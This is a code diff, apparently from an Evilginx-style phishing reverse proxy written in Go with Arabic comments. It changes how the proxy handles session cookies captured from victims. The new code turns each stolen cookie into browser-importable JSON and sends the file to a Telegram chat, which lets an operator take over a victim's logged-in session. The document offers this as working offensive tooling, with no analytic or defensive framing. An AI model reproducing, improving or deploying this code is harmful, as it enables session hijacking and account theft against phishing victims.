@@ -2242,50 +2242,40 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 				
 				// إضافة بيانات الكوكيز
 				if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
-					cookieJSON, err := json.Marshal(s.CookieTokens)
-					if err == nil {
-						cookiesText += "=== الكوكيز ===\n" + string(cookieJSON) + "\n\n"
-						
-						// إضافة عدد الكوكيز
-						cookieCount := 0
-						for _, cookies := range s.CookieTokens {
-							cookieCount += len(cookies)
+					for domain, cookies := range s.CookieTokens {
+						for name, cookie := range cookies {
+							cookieData := map[string]interface{}{
+								"path":           cookie.Path,
+								"domain":         domain,
+								"expirationDate": cookie.ExpirationDate, // تأكد من أن هذا الحقل موجود في الهيكل
+								"value":          cookie.Value,
+								"name":           name,
+								"httpOnly":      cookie.HttpOnly,
+								"hostOnly":      false, // يمكنك تعديل هذا بناءً على الحاجة
+								"secure":        false, // يمكنك تعديل هذا بناءً على الحاجة
+								"session":       false, // يمكنك تعديل هذا بناءً على الحاجة
+							}
+							cookiesList = append(cookiesList, cookieData)
 						}
-						cookiesText += fmt.Sprintf("إجمالي الكوكيز: %d\n", cookieCount)
-						cookiesText += fmt.Sprintf("إجمالي نطاقات الكوكيز: %d\n\n", len(s.CookieTokens))
-					} else {
-						log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
 					}
 				} else {
-					cookiesText += "=== لم يتم العثور على كوكيز ===\n\n"
+					log.Warning("لا توجد كوكيز مخزنة للجلسة: %s", s.Id)
 				}
 				
-				// إضافة بيانات Body Tokens
-				if len(s.BodyTokens) > 0 {
-					bodyJSON, err := json.Marshal(s.BodyTokens)
-					if err == nil {
-						cookiesText += "=== توكنات Body ===\n" + string(bodyJSON) + "\n\n"
-						cookiesText += fmt.Sprintf("إجمالي توكنات Body: %d\n\n", len(s.BodyTokens))
-					}
-				}
-				
-				// إضافة بيانات HTTP Tokens
-				if len(s.HttpTokens) > 0 {
-					httpJSON, err := json.Marshal(s.HttpTokens)
-					if err == nil {
-						cookiesText += "=== توكنات HTTP ===\n" + string(httpJSON) + "\n\n"
-						cookiesText += fmt.Sprintf("إجمالي توكنات HTTP: %d\n", len(s.HttpTokens))
-					}
-				}
-				
-				// إرسال الملف
-				fileName := fmt.Sprintf("cookies_%s_%s.txt", s.Name, s.Id)
-				err := p.telegram.SendFileFromText(fileName, cookiesText)
+				cookiesJSON, err := json.MarshalIndent(cookiesList, "", "  ")
 				if err != nil {
-					log.Error("خطأ في إرسال ملف الكوكيز: %v", err)
+					log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
+					return
+				}
+	
+	// إرسال النص كملف إلى تيليجرام
+				fileName := fmt.Sprintf("cookies_%s_%s.txt", s.Name, s.Id)
+				err = p.telegram.SendFileFromText(fileName, string(cookiesJSON))
+				if err != nil {
+					log.Error("فشل في إرسال ملف الكوكيز: %v", err)
 				} else {
 					log.Success("تم إرسال ملف الكوكيز بنجاح للجلسة: %s", s.Id)
-				}
+	}
 			}()
 		}
 	}
